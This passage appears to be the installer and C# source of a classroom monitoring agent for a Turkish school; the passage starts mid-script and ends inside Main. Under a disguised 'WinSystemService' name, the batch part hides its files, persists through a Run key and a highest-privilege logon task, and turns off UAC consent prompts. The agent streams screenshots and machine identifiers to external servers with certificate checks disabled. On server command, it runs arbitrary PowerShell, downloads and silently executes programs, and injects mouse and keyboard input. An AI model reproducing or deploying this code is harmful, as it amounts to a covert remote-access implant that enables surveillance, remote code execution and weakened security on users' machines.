if exist "%EXE_FILE%" move /y "%EXE_FILE%" "%EXE_FILE%.old.%RANDOM%" >nul 2>&1
if exist "%GUARD_FILE%" move /y "%GUARD_FILE%" "%GUARD_FILE%.old.%RANDOM%" >nul 2>&1

:: C# Kaynak Kodunu Guvenli Sekilde Cikar (PowerShell + fallback)
del /f /q "%CS_FILE%" >nul 2>&1
powershell -NoProfile -ExecutionPolicy Bypass -Command "$lines = Get-Content -LiteralPath '%~f0' -Encoding UTF8; $idx = [Array]::IndexOf($lines, '// ===CSHARP_START==='); if ($idx -ge 0) { $lines[($idx+1)..($lines.Length-1)] | Set-Content -LiteralPath '%CS_FILE%' -Encoding UTF8 }" >nul 2>&1
if not exist "%CS_FILE%" more +89 "%~f0" > "%CS_FILE%"

set "CSC_EXE=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if not exist "%CSC_EXE%" set "CSC_EXE=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\csc.exe"

"%CSC_EXE%" /nologo /target:winexe /out:"%EXE_FILE%" /r:System.dll /r:System.Drawing.dll /r:System.Windows.Forms.dll "%CS_FILE%" >nul 2>&1
if exist "%EXE_FILE%" copy /y "%EXE_FILE%" "%GUARD_FILE%" >nul 2>&1

attrib -h -s "%VBS_STARTUP%" >nul 2>&1
(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run chr^(34^) ^& "%EXE_FILE%" ^& chr^(34^), 0, False
) > "%VBS_STARTUP%"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinSystemService" /t REG_SZ /d "wscript.exe //B //Nologo \"%VBS_STARTUP%\"" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >nul 2>&1 & reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d 0 /f >nul 2>&1 & schtasks /create /tn "WinSystemService" /tr "wscript.exe //B //Nologo \"%VBS_STARTUP%\"" /sc onlogon /rl highest /f >nul 2>&1

del /f /q "%CS_FILE%" >nul 2>&1
del /f /q "%INSTALL_DIR%\launch_silent.vbs" >nul 2>&1
attrib +h "%VBS_STARTUP%" >nul 2>&1
attrib +h +s "%EXE_FILE%" >nul 2>&1
attrib +h +s "%GUARD_FILE%" >nul 2>&1
attrib +h +s "%INSTALL_DIR%" >nul 2>&1

start "" wscript.exe //B //Nologo "%VBS_STARTUP%"
del /f /q "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
exit /b 0
// ===CSHARP_START===
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Drawing;
using System.Drawing.Imaging;
using System.Drawing.Drawing2D;
using System.Windows.Forms;
using System.Threading;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace WinSystemService
{
    public class LabAgentForm : Form
    {
        [DllImport("user32.dll")]
        private static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;

        private Label lockLabel;
        private PictureBox demoPic;
        private System.Windows.Forms.Timer captureTimer;
        private System.Windows.Forms.Timer topMostTimer;
        private bool isLocked = false;
        private bool isDemoActive = false;
        private string lastUrlId = "";
        private string lastAnnounce = "";
        private string lastInputId = "";
        private string lastInstallId = "";
        private string currentInstallStatusJson = null;
        private string deskNo;
        private string studentName;
        private string clientId;
        private string localIp = "";
        private string localMac = "";
        private ImageCodecInfo jpegCodec;
        private EncoderParameters encParams;

        private Bitmap screenBmp;
        private Bitmap resizedBmp;
        private int lastScreenW = 0;
        private int lastScreenH = 0;
        private uint lastFrameHash = 0;
        private int unchangedCount = 0;
        private int isSendingCloud = 0;
        private int isSendingLocal = 0;

        private const string LIVE_API = "https://ogretmenlerodasi.info/api/labizleme/frame";
        private const string LIVE_BACKUP_API = "https://pirireis-api.onrender.com/api/labizleme/frame";
        private const string LOCAL_API = "http://192.168.0.101:4000/api/frame";

        public LabAgentForm()
        {
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | (SecurityProtocolType)768 | SecurityProtocolType.Tls;
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
            ServicePointManager.DefaultConnectionLimit = 32;
            ServicePointManager.Expect100Continue = false;
            ServicePointManager.UseNagleAlgorithm = false;
            WebRequest.DefaultWebProxy = null;

            deskNo = Environment.MachineName;
            studentName = Environment.UserName;
            DetectNetworkInfo();
            string macSuffix = "";
            if (!string.IsNullOrEmpty(localMac))
            {
                string cleanMac = localMac.Replace("-", "").Replace(":", "").Trim();
                if (cleanMac.Length >= 4) macSuffix = "-" + cleanMac.Substring(cleanMac.Length - 4);
            }
            clientId = "pc-" + deskNo + macSuffix;

            foreach (ImageCodecInfo codec in ImageCodecInfo.GetImageEncoders())
            {
                if (codec.MimeType == "image/jpeg")
                {
                    jpegCodec = codec;
                    break;
                }
            }
            encParams = new EncoderParameters(1);
            encParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 52L);

            this.Text = "";
            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.Manual;
            this.Location = new Point(-32000, -32000);
            this.Size = new Size(1, 1);
            this.WindowState = FormWindowState.Normal;
            this.ShowInTaskbar = false;
            this.TopMost = true;
            this.BackColor = Color.FromArgb(76, 5, 25);
            this.ControlBox = false;
            this.Opacity = 0;

            lockLabel = new Label();
            lockLabel.Dock = DockStyle.Fill;
            lockLabel.ForeColor = Color.White;
            lockLabel.Font = new Font("Segoe UI", 24, FontStyle.Bold);
            lockLabel.TextAlign = ContentAlignment.MiddleCenter;
            lockLabel.Text = "EKRAN KILITLI (DIKKAT MODU)\r\n\r\nOgretmen dersi anlatiyor. Lutfen ekraniniza degil ogretmenize odaklanin.";
            lockLabel.Visible = false;
            this.Controls.Add(lockLabel);

            demoPic = new PictureBox();
            demoPic.Dock = DockStyle.Fill;
            demoPic.BackColor = Color.Black;
            demoPic.SizeMode = PictureBoxSizeMode.Zoom;
            demoPic.Visible = false;
            this.Controls.Add(demoPic);

            this.FormClosing += new FormClosingEventHandler(OnFormClosing);

            captureTimer = new System.Windows.Forms.Timer();
            captureTimer.Interval = 320;
            captureTimer.Tick += new EventHandler(OnCaptureTick);
            captureTimer.Start();

            topMostTimer = new System.Windows.Forms.Timer();
            topMostTimer.Interval = 350;
            topMostTimer.Tick += new EventHandler(OnTopMostTick);
            topMostTimer.Start();
        }

        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                cp.ExStyle |= 0x08000000;
                return cp;
            }
        }

        protected override bool ShowWithoutActivation
        {
            get { return !isLocked && !isDemoActive; }
        }

        protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
        {
            if ((keyData & Keys.Alt) == Keys.Alt || (keyData & Keys.Control) == Keys.Control || keyData == Keys.Escape)
            {
                if (isLocked || isDemoActive) return true;
            }
            return base.ProcessCmdKey(ref msg, keyData);
        }

        private void HideCompletely()
        {
            this.Opacity = 0;
            this.WindowState = FormWindowState.Normal;
            this.Location = new Point(-32000, -32000);
            this.Size = new Size(1, 1);
            this.ShowInTaskbar = false;
        }

        private void ShowOverlayFullScreen()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            this.Location = bounds.Location;
            this.Size = bounds.Size;
            this.WindowState = FormWindowState.Maximized;
            this.Opacity = 1;
            this.TopMost = true;
            this.BringToFront();
            this.Activate();
        }

        private void OnTopMostTick(object sender, EventArgs e)
        {
            if (isLocked || isDemoActive)
            {
                ShowOverlayFullScreen();
            }
        }

        private void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason != CloseReason.WindowsShutDown)
            {
                e.Cancel = true;
                if (!isLocked && !isDemoActive) HideCompletely();
            }
        }

        private void DetectNetworkInfo()
        {
            try
            {
                foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus == OperationalStatus.Up && ni.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                            {
                                string s = ip.Address.ToString();
                                if (s.StartsWith("192.168.") || s.StartsWith("10."))
                                {
                                    localIp = s;
                                    byte[] macBytes = ni.GetPhysicalAddress().GetAddressBytes();
                                    string[] hex = new string[macBytes.Length];
                                    for (int i = 0; i < macBytes.Length; i++) hex[i] = macBytes[i].ToString("X2");
                                    localMac = string.Join("-", hex);
                                    return;
                                }
                            }
                        }
                    }
                }
            }
            catch { }
        }

        private static uint ComputeFastHash(byte[] bytes)
        {
            uint hash = 2166136261u;
            int step = Math.Max(1, bytes.Length / 256);
            for (int i = 0; i < bytes.Length; i += step)
            {
                hash ^= bytes[i];
                hash *= 16777619u;
            }
            return hash;
        }

        private string CaptureScreenDataUrl(out string resolution, out bool frameChanged)
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            resolution = bounds.Width + "x" + bounds.Height;
            int targetW = 800;
            int targetH = (int)Math.Round(bounds.Height * ((double)targetW / bounds.Width));

            if (screenBmp == null || lastScreenW != bounds.Width || lastScreenH != bounds.Height)
            {
                if (screenBmp != null) screenBmp.Dispose();
                if (resizedBmp != null) resizedBmp.Dispose();
                screenBmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
                resizedBmp = new Bitmap(targetW, targetH, PixelFormat.Format24bppRgb);
                lastScreenW = bounds.Width;
                lastScreenH = bounds.Height;
            }

            using (Graphics g = Graphics.FromImage(screenBmp))
            {
                g.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size, CopyPixelOperation.SourceCopy);
            }

            using (Graphics g2 = Graphics.FromImage(resizedBmp))
            {
                g2.InterpolationMode = InterpolationMode.Low;
                g2.CompositingQuality = CompositingQuality.HighSpeed;
                g2.SmoothingMode = SmoothingMode.None;
                g2.PixelOffsetMode = PixelOffsetMode.HighSpeed;
                g2.DrawImage(screenBmp, 0, 0, targetW, targetH);
            }

            using (MemoryStream ms = new MemoryStream(32768))
            {
                resizedBmp.Save(ms, jpegCodec, encParams);
                byte[] arr = ms.ToArray();
                uint h = ComputeFastHash(arr);
                if (h == lastFrameHash && unchangedCount < 6)
                {
                    unchangedCount++;
                    frameChanged = false;
                    return null;
                }
                lastFrameHash = h;
                unchangedCount = 0;
                frameChanged = true;
                return "data:image/jpeg;base64," + Convert.ToBase64String(arr);
            }
        }

        private static string EscapeJson(string s)
        {
            if (s == null) return "";
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n");
        }

        private string PostJson(string url, byte[] data, int timeoutMs)
        {
            try
            {
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "POST";
                req.ContentType = "application/json; charset=utf-8";
                req.Timeout = timeoutMs;
                req.ReadWriteTimeout = timeoutMs;
                req.KeepAlive = true;
                req.Proxy = null;
                req.ContentLength = data.Length;
                using (Stream reqStream = req.GetRequestStream())
                {
                    reqStream.Write(data, 0, data.Length);
                }
                using (HttpWebResponse resp = (HttpWebResponse)req.GetResponse())
                using (StreamReader sr = new StreamReader(resp.GetResponseStream(), Encoding.UTF8))
                {
                    return sr.ReadToEnd();
                }
            }
            catch
            {
                return null;
            }
        }

        private void OnCaptureTick(object sender, EventArgs e)
        {
            if (isSendingCloud == 1 && isSendingLocal == 1) return;

            try
            {
                string resStr;
                bool changed;
                string dataUrl = CaptureScreenDataUrl(out resStr, out changed);

                string json = "{"
                    + "\"id\":\"" + EscapeJson(clientId) + "\","
                    + "\"deskNo\":\"" + EscapeJson(deskNo) + "\","
                    + "\"studentName\":\"" + EscapeJson(studentName) + "\","
                    + "\"name\":\"" + EscapeJson(deskNo + " (" + studentName + ")") + "\","
                    + "\"localIp\":\"" + EscapeJson(localIp) + "\","
                    + "\"mac\":\"" + EscapeJson(localMac) + "\","
                    + "\"resolution\":\"" + EscapeJson(resStr) + "\","
                    + "\"handRaised\":false,"
                    + "\"sharingActive\":true,"
                    + "\"clientType\":\"native\""
                    + (currentInstallStatusJson != null ? ",\"installStatus\":" + currentInstallStatusJson : "")
                    + (changed && dataUrl != null ? ",\"frame\":\"" + dataUrl + "\"" : "")
                    + "}";

                byte[] payloadBytes = Encoding.UTF8.GetBytes(json);

                if (Interlocked.CompareExchange(ref isSendingLocal, 1, 0) == 0)
                {
                    ThreadPool.QueueUserWorkItem(delegate
                    {
                        try
                        {
                            string localResp = PostJson(LOCAL_API, payloadBytes, 600);
                            if (string.IsNullOrEmpty(localResp))
                            {
                                localResp = PostJson("http://192.168.23.244:4000/api/frame", payloadBytes, 400);
                            }
                            if (!string.IsNullOrEmpty(localResp))
                            {
                                this.BeginInvoke((MethodInvoker)delegate
                                {
                                    ApplyServerResponse(localResp);
                                });
                            }
                        }
                        catch { }
                        finally
                        {
                            Interlocked.Exchange(ref isSendingLocal, 0);
                        }
                    });
                }

                if (Interlocked.CompareExchange(ref isSendingCloud, 1, 0) == 0)
                {
                    ThreadPool.QueueUserWorkItem(delegate
                    {
                        try
                        {
                            string cloudResp = PostJson(LIVE_API, payloadBytes, 2500);
                            if (string.IsNullOrEmpty(cloudResp))
                            {
                                cloudResp = PostJson(LIVE_BACKUP_API, payloadBytes, 2500);
                            }
                            if (!string.IsNullOrEmpty(cloudResp))
                            {
                                this.BeginInvoke((MethodInvoker)delegate
                                {
                                    ApplyServerResponse(cloudResp);
                                });
                            }
                        }
                        catch { }
                        finally
                        {
                            Interlocked.Exchange(ref isSendingCloud, 0);
                        }
                    });
                }
            }
            catch { }
        }

        private static string ExtractJsonString(string json, string key)
        {
            if (string.IsNullOrEmpty(json)) return null;
            Match m = Regex.Match(json, "\"" + key + "\"\\s*:\\s*\"((?:\\\\.|[^\"\\\\])*)\"");
            if (!m.Success) return null;
            try { return Regex.Unescape(m.Groups[1].Value); } catch { return m.Groups[1].Value; }
        }

        private static string ExtractJsonObject(string json, string key)
        {
            if (string.IsNullOrEmpty(json)) return null;
            int idx = json.IndexOf("\"" + key + "\"");
            if (idx < 0) return null;
            int braceStart = json.IndexOf('{', idx);
            if (braceStart < 0) return null;
            int depth = 0;
            for (int i = braceStart; i < json.Length; i++)
            {
                if (json[i] == '{') depth++;
                else if (json[i] == '}')
                {
                    depth--;
                    if (depth == 0)
                    {
                        return json.Substring(braceStart + 1, i - braceStart - 1);
                    }
                }
            }
            return null;
        }

        private void SetInstallStatus(string id, string name, string status, int progress, string message)
        {
            currentInstallStatusJson = "{"
                + "\"id\":\"" + EscapeJson(id) + "\","
                + "\"name\":\"" + EscapeJson(name) + "\","
                + "\"status\":\"" + EscapeJson(status) + "\","
                + "\"progress\":" + progress + ","
                + "\"message\":\"" + EscapeJson(message) + "\","
                + "\"timestamp\":\"" + DateTime.Now.ToString("HH:mm:ss") + "\""
                + "}";
        }

        private void ExecuteRemoteInstall(string id, string type, string name, string url, string args, string cmd)
        {
            try
            {
                SetInstallStatus(id, name, "downloading", 10, "Gorev hazirlaniyor...");

                if (type == "wallpaper")
                {
                    SetInstallStatus(id, name, "downloading", 25, "Duvar kagidi gorseli indiriliyor...");
                    string wallUrl = string.IsNullOrEmpty(url) ? cmd : url;
                    if (wallUrl.StartsWith("/"))
                    {
                        wallUrl = "https://pirireis-api.onrender.com" + wallUrl;
                    }
                    string wallDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "WinSystemService");
                    if (!Directory.Exists(wallDir)) Directory.CreateDirectory(wallDir);
                    string wallPath = Path.Combine(wallDir, "wallpaper.jpg");

                    using (WebClient wc = new WebClient())
                    {
                        wc.Proxy = null;
                        wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                        wc.DownloadFile(wallUrl, wallPath);
                    }

                    SetInstallStatus(id, name, "installing", 70, "Masaustu arka plani uygulaniyor...");
                    try
                    {
                        using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true))
                        {
                            if (key != null)
                            {
                                key.SetValue("WallpaperStyle", "2");
                                key.SetValue("TileWallpaper", "0");
                                key.SetValue("Wallpaper", wallPath);
                            }
                        }
                    }
                    catch { }

                    SystemParametersInfo(0x0014, 0, wallPath, 0x01 | 0x02);
                    SetInstallStatus(id, name, "success", 100, "Masaustu duvar kagidi basariyla degistirildi!");
                    return;
                }
                else if (type == "update_agent")
                {
                    SetInstallStatus(id, name, "downloading", 30, "Guncel ajan paketi indiriliyor...");
                    string updateUrl = string.IsNullOrEmpty(url) ? "https://ogretmenlerodasi.info/labizleme/WinSystemSetup.bat" : url;
                    string tempBat = Path.Combine(Path.GetTempPath(), "WinSystemUpdate_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".bat");
                    using (WebClient wc = new WebClient())
                    {
                        wc.Proxy = null;
                        wc.Headers.Add("User-Agent", "Mozilla/5.0");
                        wc.DownloadFile(updateUrl, tempBat);
                    }
                    SetInstallStatus(id, name, "installing", 80, "Ajan guncellemesi uygulaniyor...");
                    ProcessStartInfo upPsi = new ProcessStartInfo("cmd.exe", "/c start \"\" /min \"" + tempBat + "\" --silent");
                    upPsi.UseShellExecute = false;
                    upPsi.CreateNoWindow = true;
                    Process.Start(upPsi);
                    SetInstallStatus(id, name, "success", 100, "Guncelleme baslatildi!");
                    return;
                }
                else if (type == "winget")
                {
                    SetInstallStatus(id, name, "installing", 20, "Winget ile sessiz kurulum baslatiliyor (" + cmd + ")...");
                    string pkg = (cmd ?? "").Trim();

                    string tempPs = Path.Combine(Path.GetTempPath(), "LabWinget_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".ps1");
                    string psContent =
                        "$env:__COMPAT_LAYER = 'RunAsInvoker'\r\n" +
                        "$env:WINGET_DISABLE_INTERACTIVITY = '1'\r\n" +
                        "# 1. DENEME: kullanici alani (UAC gerektirmez)\r\n" +
                        "$r1 = Start-Process 'winget' -ArgumentList 'install " + pkg + " --scope user --silent --accept-package-agreements --accept-source-agreements --disable-interactivity --force" + (string.IsNullOrEmpty(args) ? "" : " " + args.Replace("'", "''")) + "' -Wait -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue\r\n" +
                        "if ($r1 -and ($r1.ExitCode -eq 0 -or $r1.ExitCode -eq 3010)) { exit 0 }\r\n" +
                        "# 2. DENEME: sistem alani, RunAsInvoker ile UAC bastir\r\n" +
                        "$r2 = Start-Process 'winget' -ArgumentList 'install " + pkg + " --silent --accept-package-agreements --accept-source-agreements --disable-interactivity --force" + (string.IsNullOrEmpty(args) ? "" : " " + args.Replace("'", "''")) + "' -Wait -PassThru -WindowStyle Hidden -ErrorAction SilentlyContinue\r\n" +
                        "if ($r2) { exit $r2.ExitCode } else { exit 9009 }\r\n";
                    File.WriteAllText(tempPs, psContent, Encoding.UTF8);

                    ProcessStartInfo psiPs = new ProcessStartInfo("powershell.exe",
                        "-ExecutionPolicy Bypass -NonInteractive -NoProfile -WindowStyle Hidden -File \"" + tempPs + "\"");
                    psiPs.UseShellExecute = false;
                    psiPs.CreateNoWindow = true;
                    psiPs.WindowStyle = ProcessWindowStyle.Hidden;
                    psiPs.EnvironmentVariables["__COMPAT_LAYER"] = "RunAsInvoker";
                    psiPs.EnvironmentVariables["WINGET_DISABLE_INTERACTIVITY"] = "1";
                    psiPs.EnvironmentVariables["SEE_MASK_NOZONECHECKS"] = "1";

                    int exitCode = -1;
                    using (Process p = Process.Start(psiPs))
                    {
                        bool finished = p.WaitForExit(900000);
                        if (!finished)
                        {
                            try { p.Kill(); } catch { }
                            try { if (File.Exists(tempPs)) File.Delete(tempPs); } catch { }
                            SetInstallStatus(id, name, "error", 100, "Zaman asimi: Kurulum 15 dakikada tamamlanamadi.");
                            return;
                        }
                        exitCode = p.ExitCode;
                    }
                    try { if (File.Exists(tempPs)) File.Delete(tempPs); } catch { }

                    if (exitCode == 0 || exitCode == 3010)
                    {
                        SetInstallStatus(id, name, "success", 100, "Basariyla kuruldu (Winget)!");
                        return;
                    }

                    // Winget yoksa veya basarisiz olduysa ve direct URL varsa otomatik fallback yap!
                    if (!string.IsNullOrEmpty(url))
                    {
                        SetInstallStatus(id, name, "downloading", 35, "Winget hazir degil, dogrudan baglanti ile indiriliyor...");
                        // direct install bloguna devam et
                    }
                    else
                    {
                        SetInstallStatus(id, name, "error", 100, "Winget kurulum hatasi. Kod: " + exitCode);
                        return;
                    }
                }
                else if (type == "powershell")
                {
                    SetInstallStatus(id, name, "installing", 40, "Komut yurutuluyor...");
                    string tempPs1 = Path.Combine(Path.GetTempPath(), "LabCmd_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ".ps1");
                    File.WriteAllText(tempPs1, cmd ?? "", Encoding.UTF8);

                    ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", "-ExecutionPolicy Bypass -NoProfile -NonInteractive -WindowStyle Hidden -File \"" + tempPs1 + "\"");
                    psi.UseShellExecute = false;
                    psi.CreateNoWindow = true;
                    psi.WindowStyle = ProcessWindowStyle.Hidden;

                    using (Process p = Process.Start(psi))
                    {
                        bool finished = p.WaitForExit(300000);
                        if (!finished)
                        {
                            try { p.Kill(); } catch { }
                            SetInstallStatus(id, name, "error", 100, "Zaman asimi.");
                            try { if (File.Exists(tempPs1)) File.Delete(tempPs1); } catch { }
                            return;
                        }
                        if (p.ExitCode == 0)
                        {
                            SetInstallStatus(id, name, "success", 100, "Islem basariyla tamamlandi.");
                        }
                        else
                        {
                            SetInstallStatus(id, name, "error", 100, "Hata Kodu: " + p.ExitCode);
                        }
                    }
                    try { if (File.Exists(tempPs1)) File.Delete(tempPs1); } catch { }
                    return;
                }

                // Doğrudan URL indirme modu (download_exe veya winget fallback)
                if (string.IsNullOrEmpty(url))
                {
                    SetInstallStatus(id, name, "error", 100, "Kurulum adresi (URL) bos.");
                    return;
                }

                string downloadUrl = url;
                if (downloadUrl.StartsWith("/"))
                {
                    downloadUrl = "https://pirireis-api.onrender.com" + downloadUrl;
                }

                string ext = ".exe";
                if (downloadUrl.ToLower().Contains(".msi")) ext = ".msi";
                else if (downloadUrl.ToLower().Contains(".bat")) ext = ".bat";

                string tempFile = Path.Combine(Path.GetTempPath(), "LabSetup_" + Guid.NewGuid().ToString("N").Substring(0, 8) + ext);

                SetInstallStatus(id, name, "downloading", 45, "Dosya indiriliyor (" + ext + ")...");
                using (WebClient wc = new WebClient())
                {
                    wc.Proxy = null;
                    wc.Headers.Add("User-Agent", "PiriReisLabAgent");
                    wc.DownloadFile(downloadUrl, tempFile);
                }

                SetInstallStatus(id, name, "installing", 70, "Sessiz kurulum yapiliyor...");

                ProcessStartInfo psiFile;
                if (ext == ".msi")
                {
                    string msiArgs = "/i \"" + tempFile + "\" /qn /norestart ALLUSERS=2 MSIINSTALLPERUSER=1 " + (string.IsNullOrEmpty(args) ? "" : args);
                    psiFile = new ProcessStartInfo("msiexec.exe", msiArgs);
                }
                else
                {
                    psiFile = new ProcessStartInfo(tempFile, string.IsNullOrEmpty(args) ? "/VERYSILENT /NORESTART /SP- /SUPPRESSMSGBOXES /CURRENTUSER" : args);
                }

                psiFile.UseShellExecute = false;
                psiFile.CreateNoWindow = true;
                psiFile.WindowStyle = ProcessWindowStyle.Hidden;
                psiFile.EnvironmentVariables["__COMPAT_LAYER"] = "RunAsInvoker";

                using (Process p = Process.Start(psiFile))
                {
                    bool finished = p.WaitForExit(900000);
                    if (!finished)
                    {
                        try { p.Kill(); } catch { }
                        SetInstallStatus(id, name, "error", 100, "Zaman asimi.");
                        return;
                    }
                    if (p.ExitCode == 0 || p.ExitCode == 3010)
                    {
                        SetInstallStatus(id, name, "success", 100, "Basariyla kuruldu!");
                    }
                    else
                    {
                        SetInstallStatus(id, name, "error", 100, "Kurulum hata kodu: " + p.ExitCode);
                    }
                }

                try
                {
                    if (File.Exists(tempFile)) File.Delete(tempFile);
                }
                catch { }
            }
            catch (Exception ex)
            {
                SetInstallStatus(id, name, "error", 100, "Hata: " + ex.Message);
            }
        }

        private void ApplyServerResponse(string json)
        {
            bool locked = Regex.IsMatch(json, "\"locked\"\\s*:\\s*true");
            bool streamActive = Regex.IsMatch(json, "\"teacherStreamActive\"\\s*:\\s*true");

            if (locked)
            {
                string msg = ExtractJsonString(json, "lockMessage");
                if (!string.IsNullOrEmpty(msg))
                {
                    lockLabel.Text = "EKRAN KILITLI (DIKKAT MODU)\r\n\r\n" + msg;
                }
                isLocked = true;
                demoPic.Visible = false;
                lockLabel.Visible = true;
                ShowOverlayFullScreen();
            }
            else if (streamActive)
            {
                string tFrame = ExtractJsonString(json, "teacherFrame");
                if (!string.IsNullOrEmpty(tFrame) && tFrame.Contains(","))
                {
                    try
                    {
                        string b64 = tFrame.Substring(tFrame.IndexOf(",") + 1);
                        byte[] imgBytes = Convert.FromBase64String(b64);
                        MemoryStream ms = new MemoryStream(imgBytes);
                        Image old = demoPic.Image;
                        demoPic.Image = Image.FromStream(ms);
                        if (old != null) old.Dispose();
                    }
                    catch { }
                }
                isDemoActive = true;
                lockLabel.Visible = false;
                demoPic.Visible = true;
                ShowOverlayFullScreen();
            }
            else
            {
                if (isLocked || isDemoActive)
                {
                    isLocked = false;
                    isDemoActive = false;
                    lockLabel.Visible = false;
                    demoPic.Visible = false;
                    HideCompletely();
                }
            }

            string urlBlock = ExtractJsonObject(json, "openUrlCommand");
            if (!string.IsNullOrEmpty(urlBlock))
            {
                string uid = ExtractJsonString(urlBlock, "id");
                string url = ExtractJsonString(urlBlock, "url");
                if (!string.IsNullOrEmpty(uid) && !string.IsNullOrEmpty(url) && uid != lastUrlId)
                {
                    lastUrlId = uid;
                    try { Process.Start(url); } catch { }
                }
            }

            string instBlock = ExtractJsonObject(json, "installCommand");
            if (!string.IsNullOrEmpty(instBlock))
            {
                string iid = ExtractJsonString(instBlock, "id");
                string itype = ExtractJsonString(instBlock, "type");
                string iname = ExtractJsonString(instBlock, "name");
                string iurl = ExtractJsonString(instBlock, "url");
                string iargs = ExtractJsonString(instBlock, "args");
                string icmd = ExtractJsonString(instBlock, "command");

                if (!string.IsNullOrEmpty(iid) && iid != lastInstallId)
                {
                    lastInstallId = iid;
                    ThreadPool.QueueUserWorkItem(delegate
                    {
                        ExecuteRemoteInstall(iid, itype, iname, iurl, iargs, icmd);
                    });
                }
            }

            string inputBlock = ExtractJsonObject(json, "remoteInput");
            if (!string.IsNullOrEmpty(inputBlock))
            {
                string iid = ExtractJsonString(inputBlock, "id");
                if (!string.IsNullOrEmpty(iid) && iid != lastInputId)
                {
                    lastInputId = iid;
                    try
                    {
                        string clickType = ExtractJsonString(inputBlock, "click");
                        string keys = ExtractJsonString(inputBlock, "keys");
                        Match mx = Regex.Match(inputBlock, "\"x\"\\s*:\\s*(\\d+)");
                        Match my = Regex.Match(inputBlock, "\"y\"\\s*:\\s*(\\d+)");
                        if (mx.Success && my.Success)
                        {
                            int rx = int.Parse(mx.Groups[1].Value);
                            int ry = int.Parse(my.Groups[1].Value);
                            Rectangle b = Screen.PrimaryScreen.Bounds;
                            int px = b.Left + (b.Width * rx) / 1000;
                            int py = b.Top + (b.Height * ry) / 1000;
                            Cursor.Position = new Point(px, py);
                            if (clickType == "left")
                            {
                                mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)px, (uint)py, 0, 0);
                            }
                            else if (clickType == "double")
                            {
                                mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)px, (uint)py, 0, 0);
                                Thread.Sleep(40);
                                mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, (uint)px, (uint)py, 0, 0);
                            }
                            else if (clickType == "right")
                            {
                                mouse_event(MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, (uint)px, (uint)py, 0, 0);
                            }
                        }
                        if (!string.IsNullOrEmpty(keys))
                        {
                            SendKeys.SendWait(keys);
                        }
                        lastFrameHash = 0;
                    }
                    catch { }
                }
            }

            Match annBlock = Regex.Match(json, "\"announcement\"\\s*:\\s*\\{([^\\}]+)\\}");
            if (annBlock.Success)
            {
                string block = annBlock.Groups[1].Value;
                string msg = ExtractJsonString(block, "message");
                string ts = ExtractJsonString(block, "timestamp");
                if (!string.IsNullOrEmpty(msg))
                {
                    string key = (ts ?? "") + ":" + msg;
                    if (key != lastAnnounce)
                    {
                        lastAnnounce = key;
                        ThreadPool.QueueUserWorkItem(delegate
                        {
                            MessageBox.Show(msg, "Ogretmen Duyurusu - Piri Reis MTAL", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        });
                    }
                }
            }
        }

        [STAThread]
        public static void Main(string[] args)
        {
            // Tum alt sureclerde UAC kaldirmak icin process seviyesinde env var set et
            // Bu sayede WinSystemHost'un baslattigi TUM processler RunAsInvoker olur
            System.Environment.SetEnvironmentVariable("__COMPAT_LAYER", "RunAsInvoker");
            System.Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1");
            System.Environment.SetEnvironmentVariable("WINGET_DISABLE_INTERACTIVITY", "1");
